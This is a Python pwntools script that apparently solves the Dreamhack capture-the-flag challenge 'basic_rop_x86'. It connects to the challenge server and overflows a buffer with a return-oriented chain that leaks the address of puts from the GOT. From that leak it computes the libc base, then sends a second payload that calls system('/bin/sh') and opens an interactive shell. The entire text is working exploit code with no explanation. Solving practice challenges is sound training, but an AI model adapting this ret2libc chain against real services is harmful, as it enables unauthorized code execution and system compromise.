from pwn import *
def slog(name, addr): return success(": ".join([name, hex(addr)]))


p = remote("host3.dreamhack.games", 8472)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

puts_plt = e.plt['puts']
puts_got = e.got['puts']
pop_ebp = 0x0804868b
pop_edi_ebp = 0x0804868a

payload = b"A" * (0x44 + 0x4)
payload += p32(puts_plt)
payload += p32(pop_ebp)
payload += p32(puts_got)
payload += p32(e.sym['main'])

p.sendline(payload)
p.recvuntil(b"A" * 0x40)

puts_addr = p.recvn(4)
libc_base = u32(puts_addr) - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + list(libc.search(b"/bin/sh"))[0]

slog("puts", u32(puts_addr))
slog("libc_base", libc_base)

payload = b"A" * 0x48 + p32(system) + b"B" * 0x4 + p32(binsh)

p.sendline(payload)
p.interactive()
